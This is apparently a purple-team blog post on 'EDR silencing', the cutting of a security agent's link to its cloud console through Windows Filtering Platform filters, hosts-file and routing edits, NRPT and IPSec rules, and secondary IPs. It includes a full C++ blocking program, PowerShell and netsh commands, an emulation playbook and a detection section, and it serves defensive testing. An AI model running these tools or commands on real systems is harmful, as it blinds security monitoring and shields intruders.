# https://ipurple.team/2026/01/12/edr-silencing/

[Skip to content](https://ipurple.team/2026/01/12/edr-silencing/#wp--skip-link--target)

[Purple Team](https://ipurple.team/category/purple-team/)

## EDR Silencing

Published by

Administrator

on

[January 12, 2026](https://ipurple.team/2026/01/12/edr-silencing/)

![](https://ipurple.team/wp-content/uploads/2026/01/edr-silencing-image.png?w=1024)

Modern Endpoint Detection and Response systems depend on persistent, bidirectional communication with their cloud management console, enabling them to continuously report suspicious activity and receive updated instructions or response actions. If that communication is disrupted, the EDR continues to collect telemetry locally, but it can no longer generate alerts to the cloud console. Threat actors can abuse the Windows Filtering Platform or modify local name resolution components such as the hosts files to block EDR agent outbound communication. This allows them to blind the EDR cloud visibility without triggering a service crash or process termination. Loss of visibility in the endpoints, constraints the ability of defensive security teams to detect and respond to threats.

In 2023, MDSec has disclosed to the public that their internal team are taking a different approach to EDR Silencing as opposed to ransomware groups that were using kernel drivers to disrupt EDR communication. Their private tool FireBlock, leverages the Windows Filtering Platform to add rules and prevent egress traffic of the EDR agent. Based on this announcement similar proof of concepts have been developed by the information security community to emulate that behaviour.

## Playbook

Disrupting the communication channel between an EDR agent and its cloud management console, can extend significantly the duration of a security breach. Adversaries may exploit native Windows technologies and configuration files to achieve this outcome. Publicly available proof of concepts can emulate the behavior of EDR Silencing. Purple team operators should develop playbooks that incorporate multiple methods of execution to ensure broader coverage. It is important to note that modifications to block EDR communication require elevated privileges.

### Windows Filtering Platform

The Windows Filtering Platform was introduced in Windows Vista and provides a set of API’s and system services for processing, inspecting and filtering network traffic. It has been implemented by Microsoft as a replacement for older interfaces such as the Windows Firewall API and Transport Driver Interface (TDI), offering a more efficient and extensible way to implement network security features. EDR software utilise the functionality of Windows Filtering Platform to capture incoming and outbound network connections, contain assets from the network and provide data about processes making remote procedure calls.

[Chris Au](https://x.com/netero_1010) released a proof of concept in C, called [EDRSilencer](https://github.com/netero1010/EDRSilencer/) that leverages a specific set of API’s to interact with the Windows Filtering Platform and apply rules that would prevent an EDR agent to make an outbound connection to its cloud management console. Specifically, the tool uses the FwpmFilterAdd0 API to add a WFP filter:

```
EDRSilencer.exe blockedr
```

![](https://ipurple.team/wp-content/uploads/2026/01/edr-silencing-edr-silencer.png?w=934)_EDR Silencer_

The diagram below demonstrates how the EDR Silencer tool operates under the hood to block EDR communication.

![](https://ipurple.team/wp-content/uploads/2026/01/edr-silencing-diagram.jpg?w=1024)_EDR Silencing – Diagram_

A similar proof of concept that uses the same API’s was released at the [bordergate](https://www.bordergate.co.uk/blocking-edr-traffic/) website. The code below searches for processes that match the target executable names (brave, MsMpeng etc.) and uses the **QueryProcessImageW** API to obtain the full image path. The AddFilterForLayer function is utilised to create a new filter and calls the FwpmFilterAdd0 to add the rules that will block the EDR agent communication. It should be noted that the code below doesn’t introduce a new method, and it has the same behavior as the EDRSilencer. Therefore, the same detection opportunities remain applicable.

|     |     |
| --- | --- |
| 1<br>2<br>3<br>4<br>5<br>6<br>7<br>8<br>9<br>10<br>11<br>12<br>13<br>14<br>15<br>16<br>17<br>18<br>19<br>20<br>21<br>22<br>23<br>24<br>25<br>26<br>27<br>28<br>29<br>30<br>31<br>32<br>33<br>34<br>35<br>36<br>37<br>38<br>39<br>40<br>41<br>42<br>43<br>44<br>45<br>46<br>47<br>48<br>49<br>50<br>51<br>52<br>53<br>54<br>55<br>56<br>57<br>58<br>59<br>60<br>61<br>62<br>63<br>64<br>65<br>66<br>67<br>68<br>69<br>70<br>71<br>72<br>73<br>74<br>75<br>76<br>77<br>78<br>79<br>80<br>81<br>82<br>83<br>84<br>85<br>86<br>87<br>88<br>89<br>90<br>91<br>92<br>93<br>94<br>95<br>96<br>97<br>98<br>99<br>100<br>101<br>102<br>103<br>104<br>105<br>106<br>107<br>108<br>109<br>110<br>111<br>112<br>113<br>114<br>115<br>116<br>117<br>118<br>119<br>120<br>121<br>122<br>123<br>124<br>125<br>126<br>127<br>128<br>129<br>130<br>131<br>132<br>133<br>134<br>135<br>136<br>137<br>138<br>139<br>140<br>141<br>142<br>143<br>144<br>145<br>146<br>147<br>148<br>149<br>150<br>151<br>152<br>153<br>154<br>155<br>156<br>157<br>158<br>159 | `// BlockEDRTraffic.cpp`<br>`#include <windows.h>`<br>`#include <fwpmu.h>`<br>`#include <tlhelp32.h>`<br>`#include <stdio.h>`<br>`#include <vector>`<br>`#include <string>`<br>`#pragma comment(lib, "fwpuclnt.lib")`<br>`#pragma comment(lib, "rpcrt4.lib")`<br>`void``DisplayError(``const``char``* msg,``DWORD``err)`<br>`{`<br>```printf``(``"%s failed (0x%08lx)\n"``, msg, err);`<br>`}`<br>`BOOL``FindProcessPath(``const``wchar_t``* targetName, std::vector<std::wstring>& results)`<br>`{`<br>```HANDLE``snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);`<br>```if``(snapshot == INVALID_HANDLE_VALUE)`<br>```return``FALSE;`<br>```PROCESSENTRY32W pe32;`<br>```pe32.dwSize =``sizeof``(pe32);`<br>```if``(!Process32FirstW(snapshot, &pe32)) {`<br>```CloseHandle(snapshot);`<br>```return``FALSE;`<br>```}`<br>```do``{`<br>```if``(_wcsicmp(pe32.szExeFile, targetName) == 0)`<br>```{`<br>```HANDLE``hProcess = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pe32.th32ProcessID);`<br>```if``(hProcess) {`<br>```wchar_t``path[MAX_PATH];`<br>```DWORD``size = MAX_PATH;`<br>```if``(QueryFullProcessImageNameW(hProcess, 0, path, &size)) {`<br>```results.push_back(path);`<br>```}`<br>```CloseHandle(hProcess);`<br>```}`<br>```}`<br>```}``while``(Process32NextW(snapshot, &pe32));`<br>```CloseHandle(snapshot);`<br>```return``!results.empty();`<br>`}`<br>`DWORD``AddFilterForLayer(`<br>```HANDLE``engine,`<br>```FWP_BYTE_BLOB* appId,`<br>```const``GUID* layerKey,`<br>```UINT64``* filterIdOut)`<br>`{`<br>```FWPM_FILTER_CONDITION cond = { 0 };`<br>```cond.fieldKey = FWPM_CONDITION_ALE_APP_ID;`<br>```cond.matchType = FWP_MATCH_EQUAL;`<br>```cond.conditionValue.type = FWP_BYTE_BLOB_TYPE;`<br>```cond.conditionValue.byteBlob = appId;`<br>```FWPM_FILTER filter = { 0 };`<br>```filter.layerKey = *layerKey;`<br>```filter.displayData.name = _wcsdup(``L"EDR Traffic Block"``);`<br>```filter.displayData.description = _wcsdup(``L"Blocks EDR traffic"``);`<br>```filter.action.type = FWP_ACTION_BLOCK;`<br>```filter.filterCondition = &cond;`<br>```filter.numFilterConditions = 1;`<br>```filter.subLayerKey = FWPM_SUBLAYER_UNIVERSAL;`<br>```filter.weight.type = FWP_EMPTY;`<br>```return``FwpmFilterAdd0(engine, &filter, NULL, filterIdOut);`<br>`}`<br>`int``main()`<br>`{`<br>```DWORD``result;`<br>```HANDLE``engine = NULL;`<br>```// Open WFP engine`<br>```result = FwpmEngineOpen0(NULL, RPC_C_AUTHN_WINNT, NULL, NULL, &engine);`<br>```if``(result != ERROR_SUCCESS) {`<br>```DisplayError(``"FwpmEngineOpen0"``, result);`<br>```return``1;`<br>```}`<br>```printf``(``"WFP engine opened.\n"``);`<br>```const``wchar_t``* targetProcesses[] = {`<br>```L"MsMpEng.exe"``,`<br>```L"brave.exe"``,`<br>```NULL`<br>```};`<br>```std::vector<``UINT64``> allFilterIds;`<br>```for``(``int``i = 0; targetProcesses[i] != NULL; i++)`<br>```{`<br>```const``wchar_t``* exeName = targetProcesses[i];`<br>```std::vector<std::wstring> foundPaths;`<br>```if``(!FindProcessPath(exeName, foundPaths)) {`<br>```wprintf(``L"[INFO] No running processes found for %ls\n"``, exeName);`<br>```continue``;`<br>```}`<br>```for``(``const``auto``& path : foundPaths)`<br>```{`<br>```wprintf(``L"Found running instance: %ls\n"``, path.c_str());`<br>```FWP_BYTE_BLOB* appId = NULL;`<br>```result = FwpmGetAppIdFromFileName0(path.c_str(), &appId);`<br>```if``(result != ERROR_SUCCESS) {`<br>```DisplayError(``"FwpmGetAppIdFromFileName0"``, result);`<br>```continue``;`<br>```}`<br>```const``GUID* layers[] = {`<br>```&FWPM_LAYER_ALE_AUTH_CONNECT_V4,`<br>```&FWPM_LAYER_ALE_AUTH_CONNECT_V6,`<br>```&FWPM_LAYER_ALE_AUTH_RECV_ACCEPT_V4,`<br>```&FWPM_LAYER_ALE_AUTH_RECV_ACCEPT_V6`<br>```};`<br>```for``(``auto``layer : layers)`<br>```{`<br>```UINT64``filterId = 0;`<br>```result = AddFilterForLayer(engine, appId, layer, &filterId);`<br>```if``(result == ERROR_SUCCESS)`<br>```{`<br>```allFilterIds.push_back(filterId);`<br>```wprintf(``L"  [+] Filter applied for layer.\n"``);`<br>```}`<br>```else`<br>```{`<br>```DisplayError(``"AddFilterForLayer"``, result);`<br>```}`<br>```}`<br>```FwpmFreeMemory0((``void``**)&appId);`<br>```}`<br>```}`<br>```printf``(``"\nFilters installed.\n"``);`<br>```printf``(``"Press ENTER to remove all filters and exit...\n"``);`<br>```getchar``();`<br>```// Remove filters`<br>```for``(``UINT64``id : allFilterIds)`<br>```FwpmFilterDeleteById0(engine, id);`<br>```FwpmEngineClose0(engine);`<br>```printf``(``"All filters removed. Engine closed.\n"``);`<br>```return``0;`<br>`}` |

The tool could be executed from a PowerShell console or the command prompt:

```
BlockEDRTraffic.exe
```

![](https://ipurple.team/wp-content/uploads/2026/01/edr-silencing-blockedrtraffic.png?w=802)_BlockedEDRTraffic_

The set of filters configured in the Windows Filtering Platform (WFP) could be displayed by invoking the _netsh_ utility with the “ _show filters_” argument.

```
netsh wfp show filters
```

![](https://ipurple.team/wp-content/uploads/2026/01/edr-silencing-wfp-filters-command.png?w=721)_Windows Filtering Platform – Filters_

The WFP filters are exported in the _filters.xml_ file:

![](https://ipurple.team/wp-content/uploads/2026/01/edr-silencing-wfp-filters.png?w=1024)_Windows Filtering Platform – Filters_

Following the EDRSilencer, a variation was also released called [SilentButDeadly](https://github.com/loosehose/SilentButDeadly). The tool uses the same Windows API’s. Filters are added via the FwpmFilterAdd0:

![](https://ipurple.team/wp-content/uploads/2026/01/edr-silencing-silentbutdeadly-privileges-check.png?w=931)_SilentButDeadly – Privileges Check_![](https://ipurple.team/wp-content/uploads/2026/01/edr-silencing-silentbutdeadly-edr-detection.png?w=781)_SilentButDeadly – Process Identification_![](https://ipurple.team/wp-content/uploads/2026/01/edr-silencing-silentbutdeadly-network-isolation.png?w=841)_SilentButDeadly – Network Isolation_![](https://ipurple.team/wp-content/uploads/2026/01/edr-silencing-silentbutdeadly-edr-process-blocked.png?w=933)_SilentButDeadly – EDR Process Blocked_

The [WFP EDR](https://github.com/k4nfr3/WFP_EDR) tool is another proof of concept written in Go that exploits the Windows Filtering Platform to block outbound traffic from EDR agents to their cloud components. The tool initially attempts to read the _SubscriptionManager_ registry key to retrieve EDR specific configurations. The key is located in the following path:

```
SOFTWARE\Policies\Microsoft\Windows\EventLog\EventForwarding\SubscriptionManager
```

A custom WFP provider and sublayer ID and GUID are also added on the asset. The tool injects block rules into the following WFP layers:

1. **ALE\_AUTH\_CONNECT\_V4**: Denies outbound connection attempts to target IP’s/Ports.
2. **OUTBOUND\_TRANSPORT\_V4**: Drops transport layer packets

However, to prevent total isolation of the endpoint, bypass rules are also added. Unfortunately, the source code is not available, therefore Purple Team operators should not execute untrusted binaries to enterprise networks. Execution of the following command will apply rules for the Cortex XDR.

```
wfp_edr.exe -install -file xdr.json
```

![](https://ipurple.team/wp-content/uploads/2026/01/edr-silencing-wfp-cortex-xdr.png?w=958)_WFP Cortex XDR_![](https://ipurple.team/wp-content/uploads/2026/01/edr-silencing-wfp-block-rules.png?w=957)_WFP Block Rules_

### Hosts File

The _hosts_ file enables administrators to bind specific domain names to IP addresses. It is not uncommon this file to contain entries to internal domains within a corporate environment. A variant of the hosts file is the _hosts.ics_ that is generated by the Internet Connection Sharing service when a computer shares its Internet connection with other devices (mobile hotspot, virtual machine etc.). The file it is used by Windows to keep track of the devices connected.

```
C:\Windows\System32\drivers\etc\hosts
C:\WINDOWS\system32\drivers\etc\hosts.ics
```

Threat actors with elevated privileges over the asset, could add entries to the hosts files to disrupt EDR communication by pointing EDR domain names to non-valid IP addresses.

|     |     |
| --- | --- |
| 1<br>2 | `Add-Content``-Path``"C:\Windows\System32\drivers\etc\hosts"``-Value``"127.0.0.1 edr.domain.com"`<br>`Add-Content``-Path``"C:\Windows\System32\drivers\etc\hosts.ics"``-Value``"127.0.0.1 edr.domain.com"` |

![](https://ipurple.team/wp-content/uploads/2026/01/edr-silencing-hosts-file.png?w=957)_Hosts File Modification_![](https://ipurple.team/wp-content/uploads/2026/01/edr-silencing-hosts-files.png?w=1024)_Hosts File_

### Routing Table

Windows Operating Systems maintain the routing table to determine how IP packets should be forwarded across networks. Threat actors could add custom routes to the routing table to prevent the agent contacting EDR IP addresses.

|     |     |
| --- | --- |
| 1<br>2 | `Get-NetIPInterface`<br>`New-NetRoute``-DestinationPrefix``"192.168.100.0/32"``-InterfaceIndex``1``-PolicyStore``ActiveStore` |

![](https://ipurple.team/wp-content/uploads/2026/01/edr-silencing-add-route.png?w=958)_Add Route_![](https://ipurple.team/wp-content/uploads/2026/01/edr-silencing-routing-table.png?w=960)_Routing Table_

### Name Resolution Policy Table

The Name Resolution Policy Table (NRPT) is a configuration component part of the Windows operating system that is used to control how specific domain names are resolved. Specifically, the table determines which DNS servers should be used for specific domains and whether a name should be resolved using internal or external infrastructure. It is important to note that the DNS client on Windows will always check the table and if a record doesn’t exist the default DNS server will be used.

For assets that are protected by Windows Defender for Endpoint, Microsoft has released in public a full [list](https://download.microsoft.com/download/mde-streamlined-urls-commercial.xlsx) of domain names and URL’s that are required by the EDR. Threat actors who have already compromised a network with Windows Defender for Endpoint deployed, could add entries to the Name Resolution Policy Table that will redirect all DNS queries associated with Defender for Endpoint to localhost. A similar approach could be conducted for other EDR’s. The _Add-DnsClientNrptRule_ PowerShell cmdlet can be used to add records:

|     |     |
| --- | --- |
| 1<br>2<br>3 | `Add-DnsClientNrptRule``-Namespace``".endpoint.security.microsoft.com"``-NameServers``127.0.0.1``-Comment``"Silenced by Name Resolution Policy Table"`<br>`Add-DnsClientNrptRule``-Namespace``"endpoint.security.microsoft.com"``-NameServers``127.0.0.1``-Comment``"Silenced by Name Resolution Policy Table"`<br>`Clear-DnsClientCache` |

![](https://ipurple.team/wp-content/uploads/2026/01/edr-silencing-name-resolution-policy-table.png?w=973)_Name Resolution Policy Table_

Name Resolution Policy Table rules are stored in the following registry location:

```
HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows NT\DNSClient\DnsPolicyConfig
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Dnscache\Parameters\DnsPolicyConfig
```

![](https://ipurple.team/wp-content/uploads/2026/01/edr-silencing-name-resolution-policy-table-rules.png?w=939)_Name Resolution Policy Table Rules_

### IPSec Filter Rules

The purpose of IPSec Filter Rules is to encrypt or authenticate traffic. IPSec operates at the network layer, where traffic is wrapped in an ESP (Encapsulating Security Payload) header. IPSec Filter Rules, determine how traffic should be handled and effectively serve as the logic engine for encryption decisions. There are three possible outcomes for a packet:

1. Permit – Traffic Pass-Through without Encryption
2. Block – Traffic is Prevented
3. Negotiate Security – Packets are Protected

IPSec Filter Rules can be used to block Endpoint Detection and Response communication even if IPSec is not configured on the endpoint.

```
netsh ipsec static add policy name=ipurplePolicy description=ipurplePolicy
netsh ipsec static set policy name=ipurplePolicy assign=y
netsh ipsec static add filteraction name=BlockFilterAction action=block
netsh ipsec static add rule name=BlockRule policy=ipurplePolicy filterlist=BlockFilterList filteraction=BlockFilterAction description="IPSec Block Rule"
```

![](https://ipurple.team/wp-content/uploads/2026/01/edr-silencing-add-ipsec-filter-rules.png?w=960)_Add IPSec Filter Rules_

Execution of the command below will confirm that the new policy has been created:

```
netsh ipsec static show all
```

![](https://ipurple.team/wp-content/uploads/2026/01/edr-silencing-ipsec-filter-rules.png?w=922)_IPSec Filter Rules_

Local IPSec policy configurations are stored in the registry. The values of IP addresses are not human readable and are stored in hexadecimal format.

```
HKLM\Software\Policies\Microsoft\Windows\IPSec\Policy\Local\ipsecFilter{GUID}\ipsecData
```

![](https://ipurple.team/wp-content/uploads/2026/01/edr-silencing-ipsec-policy-registry-key.png?w=1024)_IPSec Policy Registry Key_

### Secondary IP Addresses

A lightweight method to cause EDR communication disruption is to assign the network interface multiple IP addresses that belong to the EDR. If the interface on the asset has a foreign public IP address assigned to it, the routing table will not forward packets to the Internet and instead will deliver them locally. The connection will fail because no application will listen on that IP address. [Iliya Dafchev](https://x.com/iliyadafchev) released a PowerShell script that could monitor a specific set of EDR processes for TCP connections, capture the remote address of each connection and assign the remote address as a secondary IP address on all physical interfaces.

![](https://ipurple.team/wp-content/uploads/2026/01/edr-silencing-ipmute.png?w=921)_IP Mute_

Upon execution of the IP Mute, the host IP configuration will change from automatic to static.

![](https://ipurple.team/wp-content/uploads/2026/01/edr-silencing-static-ip-address.png?w=766)_Static IP Address_

The secondary IP addresses field will be populated with the IP addresses that the IP Mute PowerShell script monitors.

![](https://ipurple.team/wp-content/uploads/2026/01/edr-silencing-secondary-ip-addresses.png?w=387)_Secondary IP Addresses_

It should be noted that the following registry key stores information related to static IP addresses.

```
HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces\{GUID}\IPAddress
```

Depending on how the IP addresses are added different processes are observed in the operating system. The table below shows the list of processes associated with the behavior.

| Process | Behaviour |
| --- | --- |
| wmiprvse.exe | Modification via PowerShell cmdlet |
| DllHost.exe | Modification via Graphical User Interface |
| netsh.exe | Modification via netsh utility |
| svchost.exe | DHCP Assigned |

The playbook to emulate the technique of EDR Silencing can be found below:

|     |     |
| --- | --- |
| 1<br>2<br>3<br>4<br>5<br>6<br>7<br>8<br>9<br>10<br>11<br>12<br>13<br>14<br>15<br>16<br>17<br>18<br>19<br>20<br>21<br>22<br>23<br>24<br>25<br>26<br>27<br>28<br>29<br>30<br>31<br>32<br>33<br>34<br>35<br>36<br>37<br>38<br>39<br>40<br>41<br>42<br>43<br>44<br>45<br>46<br>47<br>48<br>49<br>50<br>51<br>52<br>53<br>54<br>55<br>56<br>57<br>58<br>59<br>60<br>61<br>62<br>63<br>64<br>65<br>66<br>67<br>68<br>69<br>70<br>71<br>72<br>73<br>74<br>75<br>76<br>77<br>78<br>79<br>80<br>81<br>82<br>83<br>84<br>85<br>86<br>87<br>88<br>89<br>90<br>91<br>92<br>93<br>94<br>95<br>96<br>97<br>98<br>99<br>100 | `[``[``Playbook.EDR Silencing``]``]`<br>`id =``"1.0.0"`<br>`name =``"1.0.0 - EDR Silencing"`<br>`description =``"EDR agent communucation disruption via Windows Filtering Platform"`<br>`tooling.name =``"EDRSilencer"`<br>`tooling.references =``[`<br>```"https://github.com/netero1010/EDRSilencer/"`<br>`]`<br>`executionSteps =``[`<br>```"shell EDRSilencer.exe blockedr"`<br>`]`<br>`executionRequirements =``[`<br>```"Local Administrator"`<br>`]`<br>`[``[``Playbook.EDR Silencing``]``]`<br>`id =``"1.1.0"`<br>`name =``"1.1.0 - EDR Silencing"`<br>`description =``"EDR agent communucation disruption via Name Resolution Policy Table"`<br>`tooling.name =``"N/A"`<br>`tooling.references =``[`<br>```"N/A"`<br>`]`<br>`executionSteps =``[`<br>```"Add-DnsClientNrptRule -Namespace "``.endpoint.security.microsoft.com``" -NameServers 127.0.0.1 -Comment "``Silenced by Name Resolution Policy Table``""`<br>```"Add-DnsClientNrptRule -Namespace "``endpoint.security.microsoft.com``" -NameServers 127.0.0.1 -Comment "``Silenced by Name Resolution Policy Table``""`<br>`]`<br>`executionRequirements =``[`<br>```"Local Administrator"`<br>`]`<br>`[``[``Playbook.EDR Silencing``]``]`<br>`id =``"1.2.0"`<br>`name =``"1.2.0 - Hosts File"`<br>`description =``"EDR agent communucation disruption via Host file modification"`<br>`tooling.name =``"N/A"`<br>`tooling.references =``[`<br>```"N/A"`<br>`]`<br>`executionSteps =``[`<br>```"Add-Content -Path "``C``:``\Windows\System32\drivers\etc\hosts``" -Value "``127.0.0.1 edr.domain.com``""`<br>```"Add-Content -Path "``C``:``\Windows\System32\drivers\etc\hosts.ics``" -Value "``127.0.0.1 edr.domain.com``""`<br>`]`<br>`executionRequirements =``[`<br>```"Local Administrator"`<br>`]`<br>`[``[``Playbook.EDR Silencing``]``]`<br>`id =``"1.3.0"`<br>`name =``"1.3.0 - IPSec Filter Rules"`<br>`description =``"EDR agent communucation disruption via IPSec Filter Rules"`<br>`tooling.name =``"netsh"`<br>`tooling.references =``[`<br>```"N/A"`<br>`]`<br>`executionSteps =``[`<br>```"netsh ipsec static add policy name=ipurplePolicy description=ipurplePolicy"`<br>```"netsh ipsec static set policy name=ipurplePolicy assign=y"`<br>```"netsh ipsec static add filter filterlist=BlockFilterList srcaddr=me dstaddr=X.X.X.X protocol=tcp description="``FilterList``""`<br>```"netsh ipsec static add filter filterlist=BlockFilterList srcaddr=me dstaddr=X.X.X.X dstmask=24 protocol=tcp description="``FilterList``""`<br>```"netsh ipsec static add filter filterlist=BlockFilterList srcaddr=me dstaddr=X.X.X.X Y.Y.Y.Y dstmask=32 protocol=tcp description="``FilterList``""`<br>```"netsh ipsec static add filter filterlist=BlockFilterList srcaddr=me dstaddr=X.X.X.X-Y.Y.Y.Y dstmask=32 protocol=tcp description="``FilterList``""`<br>```"netsh ipsec static add filter filterlist=BlockFilterList srcaddr=me dstaddr=DOMAIN.COM protocol=tcp description="``FilterList``""`<br>```"netsh ipsec static add filteraction name=BlockFilterAction action=block"`<br>```"netsh ipsec static add rule name=BlockRule policy=ipurplePolicy filterlist=BlockFilterList filteraction=BlockFilterAction description="``IPSec Block Rule``""`<br>`]`<br>`executionRequirements =``[`<br>```"Local Administrator"`<br>`]`<br>`[``[``Playbook.EDR Silencing``]``]`<br>`id =``"1.4.0"`<br>`name =``"1.4.0 - Routing Table"`<br>`description =``"EDR agent communucation disruption via Routing Table Tampering"`<br>`tooling.name =``"N/A"`<br>`tooling.references =``[`<br>```"N/A"`<br>`]`<br>`executionSteps =``[`<br>```"Get-NetIPInterface"`<br>```"New-NetRoute -DestinationPrefix "``192.168.100.0/32``" -InterfaceIndex 1 -PolicyStore ActiveStore"`<br>`]`<br>`executionRequirements =``[`<br>```"Local Administrator"`<br>`]`<br>`[``[``Playbook.EDR Silencing``]``]`<br>`id =``"1.5.0"`<br>`name =``"1.5.0 - Secondary IP Addresses"`<br>`description =``"Assign secondary IP Addresses to block EDR Communications"`<br>`tooling.name =``"IPMute"`<br>`tooling.references =``[`<br>```"https://github.com/idafchev/IPMute/"`<br>`]`<br>`executionSteps =``[`<br>```"PS> .\IPMute.ps1"`<br>`]`<br>`executionRequirements =``[`<br>```"Local Administrator"`<br>`]` |

The image below demonstrates the detection opportunities of the technique EDR Silencing using the Windows Filtering Platform:

![](https://ipurple.team/wp-content/uploads/2026/01/edr-silencing-technique-abstract.jpg?w=1024)

## Detection

Although many EDR Silencing procedures can be emulated using PowerShell modules and built-in binaries like _netsh_, this technique drawn attention due to its abuse of the Windows Filtering Platform. Organizations could decrease the risk of EDR Silencing related threats by enforcing group policies or via deployment of application control solutions on endpoints and servers. However, some organizations face challenges enforcing these controls, so assessing visibility and engineer detections for each procedure is necessary. The vast majority of EDR Silencing procedures rely on commands that perform registry key modifications or file modifications (i.e. hosts file). Therefore, monitoring the associated registry keys and developing rules could detect most of the threats. On the other hand, the procedure that abuses the Windows Filtering Platform require also monitoring at the API level.

### Windows Filtering Platform

Modern Endpoint Detection and Response solutions interact with the Windows Filtering Platform to enforce network level visibility, telemetry and containment. The proof of concept EDR Silencer uses a specific workflow to block EDR communication via the Windows Filtering Platform. Initially, the tool uses the CreateToolhelp32Snapshot API to take a snapshot of the running processes and perform a correlation with the hard-coded list of known EDR executables using the functions **Process32First** and **Process32Next**.

|     |     |
| --- | --- |
| 1<br>2<br>3<br>4<br>5<br>6<br>7<br>8<br>9<br>10<br>11<br>12 | `hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);`<br>```if``(hProcessSnap == INVALID_HANDLE_VALUE) {`<br>```printf``(``"[-] CreateToolhelp32Snapshot (of processes) failed with error code: 0x%x.\n"``, GetLastError());`<br>```return``;`<br>```}`<br>`pe32.dwSize =``sizeof``(PROCESSENTRY32);`<br>```if``(!Process32First(hProcessSnap, &pe32)) {`<br>```printf``(``"[-] Process32First failed with error code: 0x%x.\n"``, GetLastError());`<br>```CloseHandle(hProcessSnap);`<br>```return``;`<br>```}` |

For matched processes, the **OpenProcess** API is used to open a handle and the full image path of the EDR executables is retrieved via the **QueryFullProcessImageNameW**.

|     |     |
| --- | --- |
| 1<br>2<br>3<br>4<br>5<br>6<br>7<br>8<br>9<br>10<br>11<br>12<br>13 | `HANDLE``hProcess = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pe32.th32ProcessID);`<br>```if``(hProcess) {`<br>```WCHAR``fullPath[MAX_PATH] = {0};`<br>```DWORD``size = MAX_PATH;`<br>```FWPM_FILTER_CONDITION0 cond = {0};`<br>```FWPM_FILTER0 filter = {0};`<br>```FWPM_PROVIDER0 provider = {0};`<br>```GUID providerGuid = {0};`<br>```FWP_BYTE_BLOB* appId = NULL;`<br>```UINT64``filterId = 0;`<br>```ErrorCode errorCode = CUSTOM_SUCCESS;`<br>``<br>```QueryFullProcessImageNameW(hProcess, 0, fullPath, &size);` |

The EDR Silencer then attempts to convert the retrieved executable path to FWP Application Identifier (FWP\_BYTE\_BLOB\_TYPE). The Windows Filtering Platform uses that identifier to associate traffic with an application. In the case of EDR Silencer, it is used to associate traffic with EDR processes.

|     |     |
| --- | --- |
| 1<br>2 | `cond.conditionValue.type = FWP_BYTE_BLOB_TYPE;`<br>`cond.conditionValue.byteBlob = appId;` |

On the last stage, the tool interacts with the Windows Filtering Platform and opens a session using one of its core API’s such as the **FwpmEngineOpen0**. A custom provider named _Microsoft Corporation_ is added via the **FwpmProviderAdd0** and filters are added via the **FwpmFilterAdd0** API. The action type _FWP\_ACTION\_BLOCK_ is configured at maximum weight and is applied to block the EDR traffic.

|     |     |
| --- | --- |
| 1<br>2<br>3<br>4<br>5<br>6<br>7<br>8<br>9<br>10<br>11<br>12<br>13<br>14<br>15<br>16<br>17<br>18<br>19<br>20<br>21<br>22<br>23<br>24<br>25<br>26 | `// Addition of a Provider`<br>`if``(GetProviderGUIDByDescription(providerDescription, &providerGuid)) {`<br>```filter.providerKey = &providerGuid;`<br>```}``else``{`<br>```provider.displayData.name = providerName;`<br>```provider.displayData.description = providerDescription;`<br>```provider.flags = FWPM_PROVIDER_FLAG_PERSISTENT;`<br>```result = FwpmProviderAdd0(hEngine, &provider, NULL);`<br>`// Addition of a Filter`<br>`result = FwpmFilterAdd0(hEngine, &filter, NULL, &filterId);`<br>`// Action Block at Maximum Weight`<br>`filter.displayData.name = filterName;`<br>```filter.flags = FWPM_FILTER_FLAG_PERSISTENT;`<br>```filter.layerKey = FWPM_LAYER_ALE_AUTH_CONNECT_V4;`<br>```filter.action.type = FWP_ACTION_BLOCK;`<br>```UINT64``weightValue = 0xFFFFFFFFFFFFFFFF;`<br>```filter.weight.type = FWP_UINT64;`<br>```filter.weight.uint64 = &weightValue;`<br>```cond.fieldKey = FWPM_CONDITION_ALE_APP_ID;`<br>```cond.matchType = FWP_MATCH_EQUAL;`<br>```cond.conditionValue.type = FWP_BYTE_BLOB_TYPE;`<br>```cond.conditionValue.byteBlob = appId;`<br>```filter.filterCondition = &cond;`<br>```filter.numFilterConditions = 1;` |

Detection efforts should focus on Windows and WFP API’s and the associated API’s that are generated as a result of these activities.

#### API’s

The procedure that abuses the Windows Filtering Platform to constraint EDR agent ability to communicate back to the cloud, utilises a set of Windows Filtering Platform API calls to perform actions such as open session, enumeration, addition and deletion of filters. Microsoft has visibility (if enabled), and therefore these actions could be detected via the Windows Event logs. The table below summarize the WFP API calls and the associated windows event id’s.

| WFP API Call | Event ID | Data Source |
| --- | --- | --- |
| FwpmFilterAdd0 | 5444 | Windows Events |
| FwpmFilterAdd0 | 5157 | Windows Events |
| FwpmProviderAdd0 | 5441 | Windows Events |
| FwpmFilterEnum0 |  | Windows Events |
| FwpmFilterDeletebyId0 | 5445 | Windows Events |
| FwpmEngineOpen0 |  | Windows Events |

The procedure requires identification of the EDR processes in order to apply blocking filters. A set of Windows API calls is used to take a snapshot of the EDR processes, perform a search for known EDR processes and retrieve the full image path of the matched processes. SOC teams should validate with their Endpoint Detection and Response provider if their deployment performs hooking on these API’s. The table below summarize the API’s used by the proof of concept EDR Silencer.

| API | Purpose |
| --- | --- |
| CreateToolhelp32Snapshot | Take a snapshot of system processes |
| Process32First | Search for known EDR process names |
| Process32Next | Search for known EDR process names |
| QueryFullProcessImageName | Retrieves full image path of the EDR process |
| OpenProcess | Open handle to the specified process |

Endpoint Detection and Response technologies might have capabilities to detect EDR Silencing, though the effectiveness might vary per vendor. SOC teams should consider a proactive approach by developing multi-layered defences across their network. It is important to note that Active Directory doesn’t have enabled by default group policies to capture threats that abuse the Windows Filtering Platform. Organisations can enhance visibility by enabling auditing on the following policies:

```
Computer Configuration > Windows Settings > Security Settings > Advanced Audit Policy Configuration > Audit Policies > Policy Change > Audit Filtering Platform Policy Change
Computer Configuration > Windows Settings > Security Settings > Advanced Audit Policy Configuration > Audit Policies > Object Access > Audit Filtering Platform Connection
Computer Configuration > Windows Settings > Security Settings > Advanced Audit Policy Configuration > Audit Policies > Object Access > Audit Filtering Platform Packet Drop
```

